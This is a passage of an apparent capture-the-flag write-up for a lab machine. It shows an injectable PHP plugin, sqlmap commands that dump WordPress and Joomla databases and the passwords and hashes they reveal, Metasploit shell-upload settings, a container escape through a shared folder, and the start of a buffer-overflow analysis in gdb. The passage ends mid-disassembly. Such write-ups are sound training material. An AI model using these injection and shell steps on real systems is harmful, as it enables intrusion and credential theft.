+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/2g (CODE:200|SIZE:8595)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/about (CODE:200|SIZE:8160)
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61:8080/About (CODE:200|SIZE:8160)
+</span></span></span></code></pre></div></div>
+
+<p>If we visit <a href="https://10.10.10.61/files/" target="_blank">https://10.10.10.61/files/</a> we discover an archive lcars.zip which contains 3 files:
+</p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">501 Oct 17 04:25 lcars_db.php
+</span></span><span class="line"><span class="cl">624 Oct 17 04:32 lcars_dbpost.php
+</span></span><span class="line"><span class="cl">377 Oct 17 07:53 lcars.php</span></span></code></pre></div><p></p>
+
+<p>If we look inside lcars.php we see some info:
+</p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">Plugin Name: lcars
+</span></span><span class="line"><span class="cl">...</span></span></code></pre></div><p></p>
+
+<p>So, maybe there is installed a wordpress plugin named lcars… Interesting. Let’s have a look inside lcars_db.php:
+</p><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">"/var/www/html/wp-config.php"</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Test the connection:
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_connect_errno</span><span class="p">()){</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Connection Error
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">exit</span><span class="p">(</span><span class="s2">"Couldn't connect to the database: "</span><span class="o">.</span><span class="nx">mysqli_connect_error</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// test to retireve an ID
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'query'</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'query'</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT ID FROM wp_posts WHERE post_name = </span><span class="si">$query</span><span class="s2">"</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">"Failed to read query"</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p></p>
+
+<p>Nice. I think this code begs for an SQL injection…</p>
+
+<h1 id="sql-injection">SQL Injection</h1>
+
+<p>Let’s use sqlmap to exploit this SQLI:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">"http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22"</span> --dbms<span class="o">=</span>mysql
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
+</span></span></span><span class="line"><span class="cl"><span class="go">---
+</span></span></span><span class="line"><span class="cl"><span class="go">Parameter: query (GET)
+</span></span></span><span class="line"><span class="cl"><span class="go">    Type: boolean-based blind
+</span></span></span><span class="line"><span class="cl"><span class="go">    Title: MySQL &gt;= 5.0 boolean-based blind - Parameter replace
+</span></span></span><span class="line"><span class="cl"><span class="go">    Payload: query=(SELECT (CASE WHEN (3344=3344) THEN 3344 ELSE 3344*(SELECT 3344 FROM INFORMATION_SCHEMA.PLUGINS) END))
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Type: error-based
+</span></span></span><span class="line"><span class="cl"><span class="go">    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
+</span></span></span><span class="line"><span class="cl"><span class="go">    Payload: query=(SELECT 3017 FROM(SELECT COUNT(*),CONCAT(0x716b6a7871,(SELECT (ELT(3017=3017,1))),0x716b717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+</span></span></span><span class="line"><span class="cl"><span class="go">---
+</span></span></span></code></pre></div></div><p></p>
+
+<p>Let’s see what databases we have:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">"http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22"</span> --dbms<span class="o">=</span>mysql --dbs
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">web server operating system: Linux Debian 8.0 (jessie)
+</span></span></span><span class="line"><span class="cl"><span class="go">web application technology: PHP 5.6.31, Apache 2.4.10
+</span></span></span><span class="line"><span class="cl"><span class="go">back-end DBMS: MySQL &gt;= 5.0.0
+</span></span></span><span class="line"><span class="cl"><span class="go">available databases [8]:
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] information_schema
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] joomla
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] joomladb
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] mysql
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] performance_schema
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] sys
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] wordpress
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] wordpressdb
+</span></span></span></code></pre></div></div><p></p>
+
+<h2 id="dumping-the-wordpress-database">Dumping the wordpress database</h2>
+
+<p>Let’s dump the wordpress database:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">"http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22"</span> --dbms<span class="o">=</span>mysql -D wordpress --dump
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">wp_posts
+</span></span></span><span class="line"><span class="cl"><span class="go">--------
+</span></span></span><span class="line"><span class="cl"><span class="go">ID,guid,pinged,to_ping,post_date,post_type,post_name,menu_order,post_title,post_status,post_parent,ping_status,post_author,post_content,post_excerpt,post_date_gmt,post_modified,comment_count,post_password,post_mime_type,comment_status,post_modified_gmt,post_content_filtered
+</span></span></span><span class="line"><span class="cl"><span class="go">6,http://10.10.10.61/?p=66,&lt;blank&gt;,&lt;blank&gt;,2017-09-06 15:40:30,post,&lt;blank&gt;,0,Passwords,draft,0,open,1,Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n ,&lt;blank&gt;,0000-00-00 00:00:00,2017-09-06 15:40:30,0,&lt;blank&gt;,&lt;blank&gt;,open,2017-09-06 14:40:30,&lt;blank&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">67,http://10.10.10.61/?p=67,&lt;blank&gt;,&lt;blank&gt;,2017-09-06 
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span></code></pre></div></div><p></p>
+
+<p>Nice, we have found some passwords: Passwords: ZxJyhGem4k338S2Y, enterprisencc170, ZD3YxfnSjezg67JZ, u*Z14ru0p#ttj83zS6. But we lack a username. Let’s use wpscan to enumerate users:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> wpscan --url http://10.10.10.61/wp-content -e u
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[i] User(s) Identified:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] william.riker
+</span></span></span><span class="line"><span class="cl"><span class="go"> | Detected By: Author Posts - Display Name (Passive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="go"> | Confirmed By: Login Error Messages (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] william-riker
+</span></span></span><span class="line"><span class="cl"><span class="go"> | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...
+</span></span></span></code></pre></div></div><p></p>
+
+<p>If we do some tests, we will see that the credentials william.riker:u*Z14ru0p#ttj83zS6 are working for <a href="http://10.10.10.61/wp-login.php" target="_blank">http://10.10.10.61/wp-login.php</a></p>
+
+<h2 id="dumping-the-joomladb-database">Dumping the joomladb database</h2>
+
+<p>Now let’s dump the joomladb database:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sqlmap -u <span class="s2">"http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22"</span> --dbms<span class="o">=</span>mysql -D joomladb --dump
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">edz2g_users
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------
+</span></span></span><span class="line"><span class="cl"><span class="go">id,name,otep,email,block,otpKey,params,username,password,sendEmail,activation,resetCount,registerDate,requireReset,lastResetTime,lastvisitDate
+</span></span></span><span class="line"><span class="cl"><span class="go">400,Super User,&lt;blank&gt;,geordi.la.forge@10.10.10.61,0,&lt;blank&gt;,"{""admin_style"":"""",""admin_language"":"""",""language"":"""",""editor"":"""",""helpsite"":"""",""timezone"":""""}",geordi.la.forge,$2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy,1,0,0,2017-09-03 19:30:04,0,0000-00-00 00:00:00,2017-10-30 13:59:06
+</span></span></span><span class="line"><span class="cl"><span class="go">401,Guinan,&lt;blank&gt;,guinan@10.10.10.61,0,&lt;blank&gt;,"{""admin_style"":"""",""admin_language"":"""",""language"":"""",""editor"":"""",""helpsite"":"""",""timezone"":""""}",Guinan,$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q,0,&lt;blank&gt;,0,2017-09-06 12:38:03,0,0000-00-00 00:00:00,0000-00-00 00:00:00
+</span></span></span></code></pre></div></div><p></p>
+
+<p>Nice, we have found the credentials geordi.la.forge:ZD3YxfnSjezg67JZ for <a href="http://10.10.10.61:8080/administrator" target="_blank">http://10.10.10.61:8080/administrator</a></p>
+
+<h1 id="getting-shells">Getting shells</h1>
+
+<h2 id="getting-shell-on-wordpress-container">Getting shell on Wordpress container</h2>
+
+<p>We can get a shell on the wordpress container by editing or uploading plugins. You can do it via the web portal or metasploit etc:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf exploit(handler) &gt; use  exploit/unix/webapp/wp_admin_shell_upload 
+</span></span></span><span class="line"><span class="cl"><span class="go">msf exploit(wp_admin_shell_upload) &gt; info
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Basic options:
+</span></span></span><span class="line"><span class="cl"><span class="go">  Name       Current Setting     Required  Description
+</span></span></span><span class="line"><span class="cl"><span class="go">  ----       ---------------     --------  -----------
+</span></span></span><span class="line"><span class="cl"><span class="go">  PASSWORD   u*Z14ru0p#ttj83zS6  yes       The WordPress password to authenticate with
+</span></span></span><span class="line"><span class="cl"><span class="go">  Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+</span></span></span><span class="line"><span class="cl"><span class="go">  RHOST      10.10.10.61         yes       The target address
+</span></span></span><span class="line"><span class="cl"><span class="go">  RPORT      80                  yes       The target port (TCP)
+</span></span></span><span class="line"><span class="cl"><span class="go">  SSL        false               no        Negotiate SSL/TLS for outgoing connections
+</span></span></span><span class="line"><span class="cl"><span class="go">  TARGETURI  /                   yes       The base path to the wordpress application
+</span></span></span><span class="line"><span class="cl"><span class="go">  USERNAME   william.riker       yes       The WordPress username to authenticate with
+</span></span></span><span class="line"><span class="cl"><span class="go">  VHOST                          no        HTTP server virtual host
+</span></span></span></code></pre></div></div><p></p>
+
+<h2 id="getting-shell-on-joomla-container">Getting shell on Joomla container</h2>
+
+<p>We can get a shell on the Joomla container by editing the index.php of a template:
+Then just visit the url of that template: <a href="http://10.10.10.61:8080/templates/beez3" target="_blank">http://10.10.10.61:8080/templates/beez3</a></p>
+
+<h1 id="privilege-escalation">Privilege escalation</h1>
+
+<h2 id="escaping-from-the-joomla-container">Escaping from the Joomla container</h2>
+
+<p>We have a common shared folder /var/www/html/files/ between the Joomla container and the host on port 403. Therefore, if we upload our shell to /var/www/html/files/shell.php and then visit <a href="https://10.10.10.61/files/shell.php" target="_blank">https://10.10.10.61/files/shell.php</a> we can escape the Joomla container.</p>
+
+<h2 id="getting-root">Getting root</h2>
+
+<p>Port 32812 gave some interesting output on nmap scanning. Let’s use nc to check it:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nc 10.10.10.61 <span class="m">32812</span>
+</span></span><span class="line"><span class="cl"><span class="go">nc: using stream socket
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">                 _______ _______  ______ _______
+</span></span></span><span class="line"><span class="cl"><span class="go">          |      |       |_____| |_____/ |______
+</span></span></span><span class="line"><span class="cl"><span class="go">          |_____ |_____  |     | |    \_ ______|
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Welcome to the Library Computer Access and Retrieval System
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Enter Bridge Access Code:
+</span></span></span></code></pre></div></div><p></p>
+
+<p>Unfortunately we don’t know the code. But now we have a shell. Let’s see what is binding on port 32812
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> netstat -lntup <span class="p">|</span> grep <span class="m">32812</span>
+</span></span><span class="line"><span class="cl"><span class="go">tcp        0      0 0.0.0.0:32812           0.0.0.0:*               LISTEN      1471/xinetd
+</span></span></span></code></pre></div></div><p></p>
+
+<p>The xinetd daemon listens for incoming requests over a network and launches the appropriate service. Let’s find what that service is:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> pstree
+</span></span><span class="line"><span class="cl"><span class="go">systemd-+-VGAuthService
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-accounts-daemon-+-{gdbus}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |                 `-{gmain}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-acpid
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-agetty
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-apache2---15*[apache2]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-atd
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-cron
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-dbus-daemon
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-dockerd-+-docker-containe-+-docker-containe-+-mysqld---37*[{mysqld}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 |                 `-9*[{docker-containe}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 |-docker-containe-+-apache2---10*[apache2]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 |                 `-8*[{docker-containe}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 |-docker-containe-+-apache2-+-2*[apache2-sh-php-{msf}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 |                 |         `-10*[apache2]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 |                 `-9*[{docker-containe}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |                 `-13*[{docker-containe}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |-docker-proxy---4*[{docker-proxy}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         |-docker-proxy---3*[{docker-proxy}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         `-16*[{dockerd}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-irqbalance
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-2*[iscsid]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-lvmetad
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-lxcfs---2*[{lxcfs}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-polkitd-+-{gdbus}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |         `-{gmain}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-rsyslogd-+-{in:imklog}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |          |-{in:imuxsock}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |          `-{rs:main Q:Reg}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-snapd---7*[{snapd}]
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-sshd
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-systemd---(sd-pam)
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-systemd-journal
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-systemd-logind
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-systemd-resolve
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-systemd-timesyn---{sd-resolve}
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-systemd-udevd
+</span></span></span><span class="line"><span class="cl"><span class="go">        |-vmtoolsd---{gmain}
+</span></span></span><span class="line"><span class="cl"><span class="go">        `-xinetd---lcars
+</span></span></span></code></pre></div></div><p></p>
+
+<p>Well, the service is named “lcars”:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> which lcars
+</span></span><span class="line"><span class="cl"><span class="go">/bin/lcars
+</span></span></span></code></pre></div></div><p></p>
+
+<p>Using ltrace we discover the access code for lcars:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ltrace /bin/lcars
+</span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span><span class="line"><span class="cl"><span class="go">strcmp("somedummyinput\n", "picarda1")                    = -1
+</span></span></span><span class="line"><span class="cl"><span class="go">...
+</span></span></span></code></pre></div></div><p></p>
+
+<p>If we explore a little the lcars app, we discover that there is a segmentation fault / buffer overflow:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Enter Bridge Access Code:
+</span></span></span><span class="line"><span class="cl"><span class="go">picarda1
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Welcome to the Library Computer Access and Retrieval System
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">LCARS Bridge Secondary Controls -- Main Menu: 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">1. Navigation
+</span></span></span><span class="line"><span class="cl"><span class="go">2. Ships Log
+</span></span></span><span class="line"><span class="cl"><span class="go">3. Science
+</span></span></span><span class="line"><span class="cl"><span class="go">4. Security
+</span></span></span><span class="line"><span class="cl"><span class="go">5. StellaCartography
+</span></span></span><span class="line"><span class="cl"><span class="go">6. Engineering
+</span></span></span><span class="line"><span class="cl"><span class="go">7. Exit
+</span></span></span><span class="line"><span class="cl"><span class="go">Waiting for input: 
+</span></span></span><span class="line"><span class="cl"><span class="go">4
+</span></span></span><span class="line"><span class="cl"><span class="go">Disable Security Force Fields
+</span></span></span><span class="line"><span class="cl"><span class="go">Enter Security Override:
+</span></span></span><span class="line"><span class="cl"><span class="go">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span></span><span class="line"><span class="cl"><span class="go">Segmentation fault
+</span></span></span></code></pre></div></div><p></p>
+
+<p>Let’s find more about this using gdb:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> gdb /bin/lcars
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">(gdb) $ info functions
+</span></span></span><span class="line"><span class="cl"><span class="go">All defined functions:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Non-debugging symbols:
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000508  _init
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000540  strcmp@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000550  setresuid@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000560  printf@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000570  fflush@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000580  fgets@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000590  puts@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x000005a0  exit@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x000005b0  __libc_start_main@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x000005c0  __isoc99_scanf@plt
+</span></span></span><span class="line"><span class="cl"><span class="go">0x000005e0  _start
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000620  __x86.get_pc_thunk.bx
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000630  deregister_tm_clones
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000670  register_tm_clones
+</span></span></span><span class="line"><span class="cl"><span class="go">0x000006c0  __do_global_dtors_aux
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000710  frame_dummy
+</span></span></span><span class="line"><span class="cl"><span class="go">0x0000074c  __x86.get_pc_thunk.dx
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000750  startScreen
+</span></span></span><span class="line"><span class="cl"><span class="go">0x000007d4  disableForcefields
+</span></span></span><span class="line"><span class="cl"><span class="go">0x0000085e  main_menu
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000b6a  unable
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000ba8  bridgeAuth
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000c91  main
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000d30  __libc_csu_init
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000d90  __libc_csu_fini
+</span></span></span><span class="line"><span class="cl"><span class="go">0x00000d94  _fini
+</span></span></span></code></pre></div></div><p></p>
+
+<p>Let’s have a look inside the function disableForcefields:
+</p><div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">(gdb) $ set disassembly-flavor intel
+</span></span></span><span class="line"><span class="cl"><span class="go">(gdb) $ disass disableForcefields
+</span></span></span><span class="line"><span class="cl"><span class="go">Dump of assembler code for function disableForcefields:
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007d4 &lt;+0&gt;:    push   ebp
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007d5 &lt;+1&gt;:    mov    ebp,esp
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007d7 &lt;+3&gt;:    push   ebx
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007d8 &lt;+4&gt;:    sub    esp,0xd4
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007de &lt;+10&gt;:    call   0x620 &lt;__x86.get_pc_thunk.bx&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007e3 &lt;+15&gt;:    add    ebx,0x281d
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007e9 &lt;+21&gt;:    call   0x750 &lt;startScreen&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007ee &lt;+26&gt;:    sub    esp,0xc
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007f1 &lt;+29&gt;:    lea    eax,[ebx-0x2173]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007f7 &lt;+35&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007f8 &lt;+36&gt;:    call   0x590 &lt;puts@plt&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x000007fd &lt;+41&gt;:    add    esp,0x10
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000800 &lt;+44&gt;:    sub    esp,0xc
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000803 &lt;+47&gt;:    lea    eax,[ebx-0x2155]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000809 &lt;+53&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000080a &lt;+54&gt;:    call   0x590 &lt;puts@plt&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000080f &lt;+59&gt;:    add    esp,0x10
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000812 &lt;+62&gt;:    mov    eax,DWORD PTR [ebx-0x10]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000818 &lt;+68&gt;:    mov    eax,DWORD PTR [eax]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000081a &lt;+70&gt;:    sub    esp,0xc
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000081d &lt;+73&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000081e &lt;+74&gt;:    call   0x570 &lt;fflush@plt&gt;
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000823 &lt;+79&gt;:    add    esp,0x10
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000826 &lt;+82&gt;:    sub    esp,0x8
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000829 &lt;+85&gt;:    lea    eax,[ebp-0xd0]
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x0000082f &lt;+91&gt;:    push   eax
+</span></span></span><span class="line"><span class="cl"><span class="go">   0x00000830 &lt;+92&gt;:    lea    eax,[ebx-0x213c]
